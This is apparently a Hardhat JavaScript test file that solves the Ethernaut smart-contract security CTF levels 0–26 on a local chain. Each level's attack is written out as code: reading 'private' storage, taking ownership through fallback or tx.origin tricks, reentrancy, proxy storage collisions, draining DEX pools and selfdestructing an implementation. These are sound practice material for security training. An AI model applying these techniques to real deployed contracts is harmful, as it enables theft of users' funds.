const { getContractAddress } = require("@ethersproject/address");
let chaiAsPromised = require("chai-as-promised");
const chai = require("chai");
const { assert, expect } = chai;
chai.use(chaiAsPromised);

describe("Ethernaut", function () {
	let owner, user, hacker = null;
	const invalid           = "0x0000000000000000000000000000000000000000";
	const amount            = ethers.parseEther("0.00001");

	before(async () => {
		[owner, user, hacker] = await ethers.getSigners();
	});

	describe("Level 0 - Instance", async () => {
		it("Exploit", async () => {
			const contract = await ethers.deployContract("Instance", [ethers.encodeBytes32String("ethernaut0")]); // initial password
			const passwordCurrent = await contract.password(); // password is public and as such can be stolen
			await contract.authenticate(passwordCurrent);
			const clearedCurrent = await contract.getCleared();
			assert.isTrue(clearedCurrent, "Failed to pass level 0."); // clear to pass the level
		});
	});

	describe("Level 1 - Fallback", async () => {
		it("Exploit", async () => {
			const contract = await ethers.deployContract("Fallback", { from: owner });
			await contract.connect(hacker).contribute({ value: amount }); // send amount less than 0.001 ether to bypass "require" in the next call
			await hacker.sendTransaction({ from: hacker, to: contract, value: amount }); // trigger the receive() function to set the hacker as the new owner
			const ownerCurrent = await contract.owner();
			expect(ownerCurrent).to.equal(hacker, "Failed to pass level 1."); // become the owner to pass the level
			await contract.connect(hacker).withdraw();
			const balanceCurrent = await ethers.provider.getBalance(contract);
			expect(balanceCurrent).to.equal(0, "Failed to pass level 1."); // withdraw the whole balance to pass the level
		});
	});

	describe("Level 2 - Fallout", async () => {
		it("Exploit", async () => {
			const contract = await ethers.deployContract("Fallout");
			await contract.connect(hacker).Fal1out({ value: amount }); // typo in the constructor function makes it a normal function | setting the hacker as the new owner
			const ownerCurrent = await contract.owner();
			expect(ownerCurrent).to.equal(hacker, "Failed to pass level 2."); // become the owner to pass the level
			await contract.connect(hacker).collectAllocations();
			const balanceCurrent = await ethers.provider.getBalance(contract);
			expect(balanceCurrent).to.equal(0, "Failed to pass level 2."); // withdraw the whole balance to pass the level
		});
	});

	describe("Level 3 - CoinFlip", async () => {
		it("Exploit", async () => {
			const contract = await ethers.deployContract("CoinFlip");
			const exploit = await ethers.deployContract("CoinFlipExploit");
			for (let i = 0; i < 10; i++) {
				await exploit.run(contract); // reverse engineer the algorithm to always win
			}
			const count = await contract.consecutiveWins();
			expect(count).to.equal(10, "Failed to pass level 3."); // get 10 wins in a row to pass the level
		});
	});

	describe("Level 4 - Telephone", async () => {
		it("Exploit", async () => {
			const contract = await ethers.deployContract("Telephone", { from: owner });
			const exploit = await ethers.deployContract("TelephoneExploit");
			await exploit.run(contract, hacker); // use a proxy contract to bypass "tx.origin" check | this will set the hacker as the new owner
			const ownerCurrent = await contract.owner();
			expect(ownerCurrent).to.equal(hacker, "Failed to pass level 4."); // become the owner to pass the level
		});
	});

	describe("Level 5 - Token", async () => {
		it("Exploit", async () => {
			const contract = await ethers.deployContract("Token", [21000000], { from: owner });
			await contract.transfer(hacker, 20);
			await expect(contract.connect(hacker).transfer(user, 21)).to.be.reverted; // cause an integer underflow to pass the level | solidity v0.8.0+ is immune to underflows and overflows and will revert any such transaction
		});
	});

	describe("Level 6 - Delegation", async () => {
		it("Exploit", async () => {
			const delegate = await ethers.deployContract("Delegate", [owner]);
			const contract = await ethers.deployContract("Delegation", [delegate], { from: owner });
			const pwn = (new ethers.Interface([
				"function pwn()"
			])).encodeFunctionData("pwn");
			await hacker.sendTransaction({ from: hacker, to: contract, data: pwn }); // trigger the fallback() function to set the hacker as the new owner
			const ownerCurrent = await contract.owner();
			expect(ownerCurrent).to.equal(hacker, "Failed to pass level 6."); // become the owner to pass the level
		});
	});

	describe("Level 7 - Force", async () => {
		it("Exploit", async () => {
			const contract = await ethers.deployContract("Force");
			const exploit = await ethers.deployContract("ForceExploit");
			const balanceOld = await ethers.provider.getBalance(contract);
			await hacker.sendTransaction({ from: hacker, to: exploit, value: amount }); // send some balance to the exploit contract using the receive() function
			await exploit.run(contract); // forcefully send all the balance from the exploit contract to the target contract using selfdestruct() function			
			const balanceNew = await ethers.provider.getBalance(contract);
			assert(balanceNew > balanceOld, "Failed to pass level 7."); // make the target contract balance greater than zero to pass the level
		});
	});

	describe("Level 8 - Vault", async () => {
		it("Exploit", async () => {
			const contract = await ethers.deployContract("Vault", [ethers.encodeBytes32String("A very strong secret password")]); // the password is stored in the contract storage which is public
			const passwordCurrent = await ethers.provider.getStorage(contract, 1); // retrieve the password from the contract storage
			await contract.unlock(passwordCurrent);
			const lockedCurrent = await contract.locked();
			assert(!lockedCurrent, "Failed to pass level 8."); // unlock to pass the level
		});
	});

	describe("Level 9 - King", async () => {
		it("Exploit", async () => {
			const contract = await ethers.deployContract("King", { from: owner, value: amount });
			const exploit = await ethers.deployContract("KingExploit");
			await exploit.run(contract, { value: amount + BigInt(1) }); // set the new king and DoS the game | omit receive() and fallback() functions in the exploit contract to crash the game
			// any new transaction (attempt to become a new king) will now revert because the previous king (exploit contract) does not have the receive() and fallback() functions
			await expect(hacker.sendTransaction({ from: hacker, to: contract, value: amount + BigInt(2) })).to.be.reverted; // DoS the game to pass the level
		});
	});

	describe("Level 10 - Reentrancy", async () => {
		it("Exploit", async () => {
			const contract = await ethers.deployContract("Reentrance");
			const exploit = await ethers.deployContract("ReentranceExploit");
			await contract.donate(user, { value: amount * BigInt(3) }); // put in some balance from other user
			// const balanceOld = await ethers.provider.getBalance(contract);
			// await exploit.run(contract, { value: amount, gas: 4465030 }); // create the integer underflow using reentrancy
			// const balanceNew = await ethers.provider.getBalance(contract);
			// assert(balanceNew < balanceOld, "Failed to pass level 10."); // withdraw the whole balance to pass the level
			await expect(exploit.run(contract, { value: amount, gas: 4465030 })).to.be.reverted; // solidity v0.8.0+ is immune to underflows and overflows and will revert any such transaction
		});
	});

	describe("Level 11 - Elevator", async () => {
		it("Exploit", async () => {
			const contract = await ethers.deployContract("Elevator");
			const exploit = await ethers.deployContract("ElevatorExploit");
			await exploit.run(contract, 10);
			const topCurrent = await contract.top();
			assert(topCurrent, "Failed to pass level 11."); // get to the top floor to pass the level
		});
	});

	describe("Level 12 - Privacy", async () => {
		it("Exploit", async () => {
			const contract = await ethers.deployContract("Privacy", [[ // bytes32 array is stored in the contract storage which is public
				ethers.encodeBytes32String("0"), // 32 bytes = 64 length / 2 hex chars
				ethers.encodeBytes32String("1"),
				ethers.encodeBytes32String("2") // this is the key we need
			]]);
			// contract storage consists of multiple 32-byte slots where smaller values are grouped together to fit into one slot
			const key = await ethers.provider.getStorage(contract, 5); // retrieve the key from the contract storage
			await contract.unlock(key.slice(0, 34)); // convert / trim the key to bytes16 value
			const lockedCurrent = await contract.locked();
			assert(!lockedCurrent, "Failed to pass level 12."); // unlock to pass the level
		});
	});

	describe("Level 13 - GatekeeperOne", async () => {
		// works with truffle, need to figure out why it does not work with hardhat
		xit("Exploit", async () => {
			const contract = await ethers.deployContract("GatekeeperOne");
			const exploit = await ethers.deployContract("GatekeeperOneExploit", { from: hacker, signer: hacker }); // use a proxy contract to bypass gateOne() and gateThree() modifiers
			for (let i = 15625; i < 15630; i++) {
				// brute-force the gas to bypass gateTwo() modifier | trial and error | the scope was adjusted to speed up the test
				try {
					await exploit.connect(hacker).run(contract.target, { from: hacker, gas: 800000 + i });
					// console.log(i); // required gas is 800000 + 15628 = 815628
					break;
				} catch (err) { }
			}
			const entrantCurrent = await contract.entrant();
			expect(entrantCurrent).to.equal(hacker, "Failed to pass level 13."); // become the entrant to pass the level
		});
	});


	describe("Level 14 - GatekeeperTwo", async () => {
		it("Exploit", async () => {
			const contract = await ethers.deployContract("GatekeeperTwo");
			await contract.waitForDeployment();
			const exploit = await ethers.deployContract("GatekeeperTwoExploit", [contract], { signer: hacker });
			const entrantCurrent = await contract.entrant();
			expect(entrantCurrent).to.equal(hacker, "Failed to pass level 14."); // become the entrant to pass the level
		});
	});

	describe("Level 15 - NaughtCoin", async () => {
		it("Exploit", async () => {
			const contract = await ethers.deployContract("NaughtCoin", [owner]);
			const balanceCurrent = await contract.balanceOf(owner);
			await contract.approve(hacker, balanceCurrent); // call publicly available and unprotected ERC20 functions approve() and transferFrom() to exploit the contract
			await contract.connect(hacker).transferFrom(owner, hacker, balanceCurrent);
			const balanceNew = await contract.balanceOf(owner);
			expect(balanceNew).to.equal(0, "Failed to pass level 15."); // withdraw the whole balance to pass the level
		});
	});

	describe("Level 16 - Preservation", async () => {
		it("Exploit", async () => {
			const library1 = await ethers.deployContract("LibraryContract");
			const library2 = await ethers.deployContract("LibraryContract");
			const contract = await ethers.deployContract("Preservation", [library1, library2], { from: owner });
			const exploit = await ethers.deployContract("PreservationExploit");
			await contract.setFirstTime(exploit.target); // delegatecall() to "LibraryContract" will overwrite "timeZone1Library" address due to incorrectly defined contract storage
			await contract.connect(hacker).setFirstTime((new Date()).getTime());
			const ownerCurrent = await contract.owner();
			expect(ownerCurrent).to.equal(hacker, "Failed to pass level 16."); // become the owner to pass the level
		});
	});

	describe("Level 17 - Recovery", async () => {
		it("Exploit", async () => {
			const contract = await ethers.deployContract("Recovery");
			const exploit = await ethers.deployContract("RecoveryExploit");
			await contract.connect(owner).generateToken("InitialToken", 100000); // create a new token contract and give the owner some of the tokens
			const token = getContractAddress({ from: contract.target, nonce: 1 }); // calculate "SimpleToken" address, nonce is the number of transactions sent from the sender address; or use etherscan.io
			await user.sendTransaction({ from: user, to: token, value: amount }); // deposit some real ETH in exchange for tokens
			await exploit.run(token, hacker);
			const balanceCurrent = await ethers.provider.getBalance(token);
			expect(balanceCurrent).to.equal(0, "Failed to pass level 17."); // withdraw the whole balance to pass the level
		});
	});

	describe("Level 18 - MagicNumber", async () => {
		it("Exploit", async () => {
			const contract = await ethers.deployContract("MagicNum");
			const exploit = await ethers.deployContract("MagicNumExploit");
			await exploit.run(contract);
			const validateCurrent = await contract.validate();
			assert(validateCurrent, "Failed to pass level 18.");
			// another example without exploit contract
			// const bytecode = "0x600A600C600039600A6000F3602A60005260206000F3";
			// const txn = await hacker.sendTransaction({ from: hacker, data: bytecode }); // to create a smart contract, send a transaction without the recipient
			// const receipt = await ethers.provider.getTransactionReceipt(txn.hash);
			// await contract.setSolver(receipt.contractAddress);
			// const validateCurrent = await contract.validate();
			// assert(validateCurrent, "Failed to pass level 18.");
		});
	});

	describe("Level 19 - AlienCodex", async () => {
		it("Exploit", async () => {
			const contract = await ethers.deployContract("AlienCodex");
			const exploit = await ethers.deployContract("AlienCodexExploit");
			// await exploit.connect(hacker).run(contract);
			// const ownerCurrent = await contract.owner();
			// expect(ownerCurrent).to.equal(hacker, "Failed to pass level 19.");
			await expect(exploit.connect(hacker).run(contract)).to.be.reverted; // solidity v0.8.0+ is immune to array length underflows and overflows and will revert any such transaction
		});
	});

	describe("Level 20 - Denial", async () => {
		it("Exploit", async () => {
			const contract = await ethers.deployContract("Denial");
			const exploit = await ethers.deployContract("DenialExploit");
			await owner.sendTransaction({ from: owner, to: contract, value: amount }); // deposit some ETH to the target contract
			await contract.setWithdrawPartner(exploit); // set the hacker contract as the partner, hacker contract will always revert on target contract withdrawal
			await expect(contract.withdraw({ gasLimit: 91000 })).to.be.rejectedWith("out of gas"); // DoS the withdrawal to pass the level | balance must stay unchanged to pass the level
		});
	});

	describe("Level 21 - Shop", async () => {
		it("Exploit", async () => {
			const contract = await ethers.deployContract("Shop");
			const exploit = await ethers.deployContract("ShopExploit");
			await exploit.run(contract);
			const priceCurrent = await contract.price();
			expect(priceCurrent).to.equal(0, "Failed to pass level 21."); // get the item for free to pass the level
			const soldCurrent = await contract.isSold();
			assert(soldCurrent, "Failed to pass level 21.");
		});
	});

	describe("Level 22 - Dex", async () => {
		it("Exploit", async () => {
			const dex = await ethers.deployContract("Dex", { from: owner });
			const token_1 = await ethers.deployContract("SwappableToken", [dex, "Token 1", "TKN1", 110], { from: owner }); // create two different ERC20 tokens
			const token_2 = await ethers.deployContract("SwappableToken", [dex, "Token 2", "TKN2", 110], { from: owner });
			await dex.connect(owner).setTokens(token_1, token_2);
			// --------------------
			// level preparation
			await token_1.approve(dex, 100);
			await token_2.approve(dex, 100);
			await dex.connect(owner).addLiquidity(token_1, 100);
			await dex.connect(owner).addLiquidity(token_2, 100);
			// send 10 of each tokens to the hacker
			await token_1.connect(owner).transfer(hacker, 10);
			await token_2.connect(owner).transfer(hacker, 10);
			// --------------------
			await dex.connect(hacker).approve(dex, ethers.MaxUint256); // allow DEX to swap hacker tokens
			await dex.connect(hacker).swap(token_1, token_2, 10); // exploit the rounding error in getSwapPrice()
			await dex.connect(hacker).swap(token_2, token_1, 20);
			await dex.connect(hacker).swap(token_1, token_2, 24);
			await dex.connect(hacker).swap(token_2, token_1, 30);
			await dex.connect(hacker).swap(token_1, token_2, 41);
			await dex.connect(hacker).swap(token_2, token_1, 45);
			const balanceCurrentToken1 = await dex.balanceOf(token_1, dex);
			expect(balanceCurrentToken1).to.equal(0, "Failed to pass level 22."); // drain one of the tokens to pass the level
		});
	});

	describe("Level 23 - DexTwo", async () => {
		it("Exploit", async () => {
			const dex = await ethers.deployContract("DexTwo", { from: owner });
			const token_1 = await ethers.deployContract("SwappableTokenTwo", [dex, "Token 1", "TKN1", 110], { from: owner }); // create two different ERC20 tokens
			const token_2 = await ethers.deployContract("SwappableTokenTwo", [dex, "Token 2", "TKN2", 110], { from: owner });
			await dex.connect(owner).setTokens(token_1, token_2);
			// --------------------
			// level preparation
			await token_1.approve(dex, 100);
			await token_2.approve(dex, 100);
			await dex.connect(owner).add_liquidity(token_1, 100);
			await dex.connect(owner).add_liquidity(token_2, 100);
			// send 10 of each tokens to the hacker
			await token_1.connect(owner).transfer(hacker, 10);
			await token_2.connect(owner).transfer(hacker, 10);
			// --------------------
			const exploit = await ethers.deployContract("DexTwoExploit", ["Exploit 1", "E1", 400, hacker]); // create two different ERC20 exploit tokens

			await exploit.connect(hacker).transfer(dex, 100); // send 100 of exploit tokens to DEX
			await exploit.connect(hacker).approve(dex, ethers.MaxUint256);

			await dex.connect(hacker).swap(exploit, token_1, 100);
			await dex.connect(hacker).swap(exploit, token_2, 200);

			const balanceCurrentToken1 = await token_1.balanceOf(dex);
			const balanceCurrentToken2 = await token_2.balanceOf(dex);
			expect(balanceCurrentToken1).to.equal(0, "Failed to pass level 23."); // drain all of the tokens to pass the level
			expect(balanceCurrentToken2).to.equal(0, "Failed to pass level 23.");
		});
	});

	describe("Level 24 - Puzzle", async () => {
		it("Exploit", async () => {
			const implementationFactory = await ethers.getContractFactory("PuzzleWallet"); // implementation contract
			const implementation = await implementationFactory.deploy();

			const dataInitialize = implementationFactory.interface.encodeFunctionData("init", [ethers.parseEther("100")]); // maximum balance will be overwritten by the proxy contract due to the storage collision

			const proxyFactory = await ethers.getContractFactory("PuzzleProxy"); // transparent proxy patern
			const proxy = await proxyFactory.deploy(owner, implementation, dataInitialize);

			const proxyImplementation = implementationFactory.attach(proxy);
			await proxyImplementation.connect(owner).addToWhitelist(owner);
			await proxyImplementation.connect(owner).deposit({ value: amount * BigInt(2) }); // deposit some ETH to the target contract

			await proxy.proposeNewAdmin(hacker); // overwriting the owner of the implementation contract due to the storage collision
			const ownerCurrent = await proxyImplementation.owner();
			expect(ownerCurrent).to.equal(hacker, "Failed to pass level 24."); // become the owner of the implementation contract to pass the level

			await proxyImplementation.connect(hacker).addToWhitelist(hacker);
			const dataDeposit = [
				implementationFactory.interface.encodeFunctionData("deposit")
			];
			const dataMulticall = [
				dataDeposit[0],
				implementationFactory.interface.encodeFunctionData("multicall", [dataDeposit]), // in reality this needs manual approach, see level 25
				implementationFactory.interface.encodeFunctionData("multicall", [dataDeposit])
			]
			await proxyImplementation.connect(hacker).multicall(dataMulticall, { signer: hacker, value: amount }); // sending only 0.00001 ETH but recursively bumping balances mapping to 0.00002 ETH (total target contract balance)
			await proxyImplementation.connect(hacker).execute(hacker, amount * BigInt(3), "0x");
			const balanceCurrent = await ethers.provider.getBalance(proxyImplementation);
			expect(balanceCurrent).to.equal(0, "Failed to pass level 24."); // withdraw the whole balance from the proxy contract to pass the level

			await proxyImplementation.connect(owner).setMaxBalance(hacker.address); // overwriting the admin of the proxy contract due to the storage collision
			const adminCurrent = await proxy.admin();
			expect(adminCurrent).to.equal(hacker, "Failed to pass level 24."); // become the admin of the proxy contract to pass the level
		});
	});

	describe("Level 25 - Motorbike", async () => {
		it("Exploit", async () => {
			const implementationFactory = await ethers.getContractFactory("Engine"); // implementation contract
			const implementation = await implementationFactory.deploy();

			const proxyFactory = await ethers.getContractFactory("Motorbike"); // UUPS proxy patern
			const proxy = await proxyFactory.connect(owner).deploy(implementation);

			const proxyImplementation = implementationFactory.attach(proxy);

			// manual approach

			let implementationAddressOld = await ethers.provider.getStorage(proxyImplementation, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"); // retrieve the implementation contract address
			implementationAddressOld = "0x" + implementationAddressOld.substring(implementationAddressOld.length - 40, implementationAddressOld.length);

			const initialize = (new ethers.Interface([
				"function initialize()"
			])).encodeFunctionData("initialize");
			await hacker.sendTransaction({ from: hacker, to: implementationAddressOld, data: initialize }); // directly call the implementation contract and set the hacker as the upgrader

			const exploitFactory = await ethers.getContractFactory("MotorbikeExploit");
			const exploit = await exploitFactory.deploy();

			const upgrade = (new ethers.Interface([
				"function upgradeToAndCall(address newImplementation, bytes memory data)"
			])).encodeFunctionData("upgradeToAndCall", [exploit.target, exploitFactory.interface.encodeFunctionData("destroy", [hacker.address])]);
			await hacker.sendTransaction({ from: hacker, to: implementationAddressOld, data: upgrade }); // directly call the implementation contract and update the implementation address to the exploit contract and call selfdestruct() - this will delete the implementation contract

			let implementationAddressNew = await ethers.provider.getStorage(implementation, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"); // retrieve the new implementation contract address
			implementationAddressNew = "0x" + implementationAddressNew.substring(implementationAddressNew.length - 40, implementationAddressNew.length);
			expect(implementationAddressNew.toUpperCase()).to.equal(exploit.target.toUpperCase(), "Failed to pass level 25."); // check if the implementation address is properly updated

			// expect(await ethers.provider.getCode(implementationAddressOld)).to.equal("0x", "Failed to pass level 25."); // selfdestruct() actually no longer deletes the contract
		});
	});

	describe("Level 26 - DoubleEntryPoint", async () => {
		it("Exploit", async () => {
			const tokenOld = await ethers.deployContract("LegacyToken", { from: owner });
			const forta = await ethers.deployContract("Forta");
			const vault = await ethers.deployContract("CryptoVault", [hacker]);
			const tokenNew = await ethers.deployContract("DoubleEntryPoint", [tokenOld, vault, forta, hacker], { from: owner });

			await vault.setUnderlying(tokenNew);
			await tokenOld.connect(owner).delegateToNewContract(tokenNew);
			await tokenOld.connect(owner).mint(vault, ethers.parseEther("100"));

			console.log(await tokenOld.balanceOf(vault));
			console.log(await tokenNew.balanceOf(vault));

			await vault.sweepToken(await tokenNew.delegatedFrom());

			console.log(await tokenOld.balanceOf(vault));
			console.log(await tokenNew.balanceOf(vault));
		});
	});
});
